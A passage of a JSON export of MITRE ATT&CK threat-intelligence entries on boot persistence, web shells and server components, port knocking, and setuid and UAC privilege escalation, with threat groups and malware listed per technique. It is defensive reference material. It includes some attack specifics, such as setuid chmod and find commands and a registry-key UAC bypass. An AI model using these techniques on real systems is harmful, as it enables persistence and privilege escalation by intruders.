                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has installed a bootkit on the system to maintain persistence.[7]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "Some <name> variants incorporate an MBR rootkit.[8][9]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.[10][11]"
                    },
                    "S0112": {
                        "ID": "S0112",
                        "Name": "ROCKBOOT",
                        "Description": "<name> is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.[5]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> can implant malicious code into a compromised device's firmware.[12]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.[13][14][15][16][17]"
                    }
                }
            },
            "004": {
                "name": "ROMMONkit",
                "href": "/techniques/T1542/004",
                "description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. [1][2]ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
                "Procedure": {}
            },
            "005": {
                "name": "TFTP Boot",
                "href": "/techniques/T1542/005",
                "description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image. [1]",
                "Procedure": {}
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
        "Procedure": {}
    },
    "T1505": {
        "ttp_name": "Server Software Component",
        "ttp_id": "T1505",
        "href": "/techniques/T1505",
        "subtechnique": {
            "001": {
                "name": "SQL Stored Procedures",
                "href": "/techniques/T1505/001",
                "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.[1][2] To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.[1][2][3] Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).[4] Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.[5]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used various MS-SQL stored procedures.[6]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> used xp_cmdshell to store and execute SQL code.[7]"
                    }
                }
            },
            "002": {
                "name": "Transport Agent",
                "href": "/techniques/T1505/002",
                "description": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.[1][2] Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.[2] Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
                "Procedure": {
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> has used a malicious Microsoft Exchange transport agent for persistence.[2]"
                    }
                }
            },
            "003": {
                "name": "Web Shell",
                "href": "/techniques/T1505/003",
                "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.[1]In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).[2]",
                "Procedure": {
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team deployed the Neo-REGEORG\u202fwebshell on an internet-facing server.[3]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.[4]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has installed web shells on exploited Microsoft Exchange servers.[5][6]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used Web shells to maintain access to victim websites.[7]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used web shells for persistence or to ensure redundant access.[8]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has installed ANTAK and ASPXSPY web shells.[9]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.[10][11]"
                    },
                    "S0073": {
                        "ID": "S0073",
                        "Name": "ASPXSpy",
                        "Description": "<name> is a Web shell. The ASPXTool version used by Threat Group-3390 has been deployed to accessible servers running Internet Information Services (IIS).[12]"
                    },
                    "G0135": {
                        "ID": "G0135",
                        "Name": "BackdoorDiplomacy",
                        "Description": "<name> has used web shells to establish an initial foothold and for lateral movement within a victim's system.[13]"
                    },
                    "S1118": {
                        "ID": "S1118",
                        "Name": "BUSHWALK",
                        "Description": "<name> is a web shell that has the ability to execute arbitrary commands or write files.[14]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 deployed JScript web shells through the creation of malicious ViewState objects.[15]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles planted Web shells on Outlook Exchange servers.[16]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s server component is a Web Shell payload.[2]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used multiple web shells to maintain presence on compromised Connect Secure appliances such as WIREFIRE, GLASSTOKEN, BUSHWALK, LIGHTWIRE, and FRAMESTING.[17][18]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> uses Web shells on publicly accessible Web servers to access victim networks.[19]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has commonly created Web shells on victims' publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious files.[20]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized obfuscated and open-source web shells such as JspSpy, reGeorg, MiniWebCmdShell, and Vonloesch Jsp File Browser 1.2 to enable remote code execution and to execute commands on compromised web server.[21]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has installed web shells on compromised hosts to maintain access.[22][23]"
                    },
                    "S1120": {
                        "ID": "S1120",
                        "Name": "FRAMESTING",
                        "Description": "<name> is a web shell capable of enabling arbitrary command execution on compromised Ivanti Connect Secure VPNs.[14]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used Web shells to persist in victim environments and assist in execution and exfiltration.[24][25]"
                    },
                    "S1117": {
                        "ID": "S1117",
                        "Name": "GLASSTOKEN",
                        "Description": "<name> is a web shell capable of tunneling C2 connections and code execution on compromised Ivanti Secure Connect VPNs.[18]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy.[26][27][28][29][30]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used modified versions of open source PHP web shells to maintain access, often adding \"Dinosaur\" references within the code.[31]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> relies on web shells for an initial foothold as well as persistence into the victim's systems.[32][33]"
                    },
                    "S1119": {
                        "ID": "S1119",
                        "Name": "LIGHTWIRE",
                        "Description": "<name> is a web shell capable of command execution and establishing persistence on compromised Ivanti Secure Connect VPNs.[14]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used multiple web shells to gain execution.[34][35]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has dropped a web shell onto a compromised system.[36]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used web shells, often to maintain access to a victim network.[37][38][39]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors generated a web shell within a vulnerable Enterprise Resource Planning Web Application Server as a persistence mechanism.[40]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used their own web shells, as well as those previously placed on target systems by other threat actors, for reconnaissance and lateral movement.[41]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.[12]"
                    },
                    "S0598": {
                        "ID": "S0598",
                        "Name": "P.A.S. Webshell",
                        "Description": "<name> can gain remote access and execution on target web servers.[42]"
                    },
                    "S1108": {
                        "ID": "S1108",
                        "Name": "PULSECHECK",
                        "Description": "<name> is a web shell that can enable command execution on compromised servers.[10]"
                    },
                    "S1113": {
                        "ID": "S1113",
                        "Name": "RAPIDPULSE",
                        "Description": "<name> is a web shell that is capable of arbitrary file read on targeted web servers to exfiltrate items of interest on the victim device.[11]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used webshells including P.A.S. Webshell to maintain access to victim networks.[42]"
                    },
                    "S0185": {
                        "ID": "S0185",
                        "Name": "SEASHARPEE",
                        "Description": "<name> is a Web shell.[38]"
                    },
                    "S1110": {
                        "ID": "S1110",
                        "Name": "SLIGHTPULSE",
                        "Description": "<name> is a web shell that can read, write, and execute files on compromised servers.[10]"
                    },
                    "S1112": {
                        "ID": "S1112",
                        "Name": "STEADYPULSE",
                        "Description": "<name> is a web shell that can enable the execution of arbitrary commands on compromised web servers.[10]"
                    },
                    "S0578": {
                        "ID": "S0578",
                        "Name": "SUPERNOVA",
                        "Description": "<name> is a Web shell.[43][44][45]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used a variety of Web shells.[46]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has used a first stage web shell after compromising a vulnerable Exchange server.[47]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has started a web service in the target host and wait for the adversary to connect, acting as a web shell.[48]"
                    },
                    "G0123": {
                        "ID": "G0123",
                        "Name": "Volatile Cedar",
                        "Description": "<name> can inject web shell code into a server.[49][50]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.[51]"
                    },
                    "S1115": {
                        "ID": "S1115",
                        "Name": "WIREFIRE",
                        "Description": "<name> is a web shell that can download files to and execute arbitrary commands from compromised Ivanti Connect Secure VPNs.[17]"
                    }
                }
            },
            "004": {
                "name": "IIS Components",
                "href": "/techniques/T1505/004",
                "description": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and (optionally) Terminate{Extension/Filter}. IIS modules may also be installed to extend IIS web servers.[1][2][3][4]Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.[2][1][5][6][4][7]Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.[8][4][9]",
                "Procedure": {
                    "S1022": {
                        "ID": "S1022",
                        "Name": "IceApple",
                        "Description": "<name> is an IIS post-exploitation framework, consisting of 18 modules that provide several functionalities.[10]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components.[11]"
                    },
                    "S0072": {
                        "ID": "S0072",
                        "Name": "OwaAuth",
                        "Description": "<name> has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.[6]"
                    },
                    "S0258": {
                        "ID": "S0258",
                        "Name": "RGDoor",
                        "Description": "<name> establishes persistence on webservers as an IIS module.[12][9]"
                    }
                }
            },
            "005": {
                "name": "Terminal Services DLL",
                "href": "/techniques/T1505/005",
                "description": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.[1]Windows Services that are run as a \"generic\" process (ex: svchost.exe) load the service's DLL file, the location of which is stored in a Registry entry named ServiceDll.[2] The termsrv.dll file, typically stored in %SystemRoot%\\System32\\, is the default ServiceDll value for Terminal Services in HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\.Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.[3] Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal termsrv.dll functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent Remote Desktop Protocol sessions by either patching the termsrv.dll file or modifying the ServiceDll value to point to a DLL that provides increased RDP functionality.[4][5] On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
                "Procedure": {}
            }
        },
        "tactic": "Persistence",
        "description": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.[1]",
        "Procedure": {}
    },
    "T1205": {
        "ttp_name": "Traffic Signaling",
        "ttp_id": "T1205",
        "href": "/techniques/T1205",
        "subtechnique": {
            "001": {
                "name": "Port Knocking",
                "href": "/techniques/T1205/001",
                "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
                "Procedure": {
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can use port-knocking to authenticate itself to another implant called Cryshell to establish an indirect connection to the C2 server.[2][3]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> has authenticated itself to a different implant, Cryshell, through a port knocking and handshake procedure.[2]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.[4]"
                    }
                }
            },
            "002": {
                "name": "Socket Filters",
                "href": "/techniques/T1205/002",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the libpcap library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.[1] Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.[2][3]Filters can be installed on any Unix-like platform with libpcap installed or on Windows hosts using Winpcap.  Adversaries may use either libpcap with pcap_setfilter or the standard library function setsockopt with SO_ATTACH_FILTER options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "Procedure": {
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> installs a TCP and UDP filter on the eth0 interface.[3]"
                    },
                    "S1123": {
                        "ID": "S1123",
                        "Name": "PITSTOP",
                        "Description": "<name> can listen and evaluate incoming commands on the domain socket, created by PITHOOK malware, located at /data/runtime/cockpit/wd.fd for a predefined magic byte sequence. <name> can then duplicate the socket for further communication over TLS.[4]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r [1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage Patch System Image due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
        "Procedure": {
            "S1118": {
                "ID": "S1118",
                "Name": "BUSHWALK",
                "Description": "malware can modify the DSUserAgentCap.pm Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests.[7]"
            },
            "S0220": {
                "ID": "S0220",
                "Name": "Chaos",
                "Description": "malware provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.[8]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the /tmp/clientsDownload.sock socket.[7]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware is triggered by an incoming TCP connection to a legitimate service from a specific source port.[9][10]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.[11]"
            },
            "S0587": {
                "ID": "S0587",
                "Name": "Penquin",
                "Description": "malware will connect to C2 only after sniffing a \"magic packet\" value in TCP or UDP packets matching specific conditions.[12][13]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware has used Wake-on-Lan to power on turned off systems for lateral movement.[5]"
            },
            "S0519": {
                "ID": "S0519",
                "Name": "SYNful Knock",
                "Description": "malware can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.[3]"
            },
            "S0221": {
                "ID": "S0221",
                "Name": "Umbreon",
                "Description": "malware provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet.[14]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific malware implant. If the value does not match, the packet and the rest of the TCP session are passed to the legitimate listening application.[15]"
            },
            "S0430": {
                "ID": "S0430",
                "Name": "Winnti for Linux",
                "Description": "malware has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control (C2) mechanism.[16]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can identify a specific string in intercepted network traffic, SSH-2.0-OpenSSH_0.3xx., to trigger its command functionality.[17]"
            }
        }
    },
    "T1548": {
        "ttp_name": "Abuse Elevation Control Mechanism",
        "ttp_id": "T1548",
        "href": "/techniques/T1548",
        "subtechnique": {
            "001": {
                "name": "Setuid and Setgid",
                "href": "/techniques/T1548/001",
                "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.[1] Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.[2] This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.[3]",
                "Procedure": {
                    "S0401": {
                        "ID": "S0401",
                        "Name": "Exaramel for Linux",
                        "Description": "<name> can execute commands with high privileges via a specific binary with setuid functionality.[4]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> adds the setuid flag to a binary so it can easily elevate in the future.[2]"
                    }
                }
            },
            "002": {
                "name": "Bypass User Account Control",
                "href": "/techniques/T1548/002",
                "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[1]If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box.[2][3] An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[4]Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods[5] that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.exe can auto-elevate and execute a specified binary or script.[6][7]Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.[8]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has presented the user with a UAC prompt to elevate privileges while installing.[9]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has bypassed UAC.[10]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.[11]"
                    },
                    "S0129": {
                        "ID": "S0129",
                        "Name": "AutoIt backdoor",
                        "Description": "<name> attempts to escalate privileges by bypassing User Access Control.[12]"
                    },
                    "S0640": {
                        "ID": "S0640",
                        "Name": "Avaddon",
                        "Description": "<name> bypasses UAC using the CMSTPLUA COM interface.[13]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> has attempted to bypass UAC and gain elevated administrative privileges.[14]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC.[15]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> can suppress UAC prompts by setting the HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command registry key on Windows 10 or HKCU\\Software\\Classes\\mscfile\\shell\\open\\command on Windows 7 and launching the eventvwr.msc process, which launches <name> with elevated privileges.[16]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can bypass UAC to escalate privileges.[17]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "<name> attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.[18]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.[19][20]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.[21]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> has the ability to bypass UAC using a passuac.dll file.[22][23]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has bypassed UAC.[24]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use a number of known techniques to bypass Windows UAC.[25][26]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.[27]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> uses two distinct User Account Control (UAC) bypass techniques to escalate privileges.[28]"
                    },
                    "S0134": {
                        "ID": "S0134",
                        "Name": "Downdelph",
                        "Description": "<name> bypasses UAC to escalate privileges by using a custom \"RedirectEXE\" shim database.[29]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used the Fodhelper UAC bypass technique to gain elevated privileges.[30]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> includes various modules to attempt to bypass UAC for escalation of privileges.[31]"
                    },
                    "G0120": {
                        "ID": "G0120",
                        "Name": "Evilnum",
                        "Description": "<name> has used PowerShell to bypass UAC.[32]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> performs UAC bypass.[33][34]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can bypass UAC to elevate process privileges on a compromised host.[35]"
                    },
                    "S0531": {
                        "ID": "S0531",
